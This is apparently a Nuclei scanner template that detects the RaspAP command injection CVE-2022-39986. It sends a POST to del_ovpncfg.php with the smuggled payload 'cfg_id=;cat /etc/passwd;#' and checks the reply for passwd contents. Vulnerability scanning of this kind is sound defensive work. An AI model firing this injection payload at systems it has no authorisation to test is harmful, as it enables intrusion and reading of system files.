id: cve-2022-39986
info:
  name: Raspap Command Injection Vulnerability (CVE-2022-39986)
  author: ProjectDiscoveryAI
  severity: critical
  tags: command-injection
  description: |
    This template detects command injection vulnerability in Raspap via the `del_ovpncfg.php` endpoint.

http:
  - method: POST
    path:
      - "{{BaseURL}}/ajax/openvpn/del_ovpncfg.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      cfg_id=;cat /etc/passwd;#
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: body
        words:
          - "<"
        negative: true
